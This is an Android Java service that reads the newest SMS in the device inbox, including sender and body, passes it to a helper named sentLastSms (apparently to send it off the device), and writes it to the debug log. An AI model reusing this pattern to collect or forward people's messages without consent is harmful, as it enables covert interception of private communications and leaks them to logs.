package com.gravity.andorid.app.services;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.gravity.andorid.business.net.BuddyDatabaseHelper;

public class SmsService extends Service {
    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String msgData = "";
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"body", "address"}
                , null, null, "date desc limit 1");

        if (cursor.moveToFirst()) {
            do {

                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    msgData += " " + cursor.getColumnName(i) + "  " + cursor.getString(i);
                }
            }
            while (cursor.moveToNext());
        } else {
            msgData = "No Sms Received";
        }
        BuddyDatabaseHelper.getInstance(this).sentLastSms(msgData);
        Log.d("Sms", msgData);

        stopSelf();

        return START_NOT_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
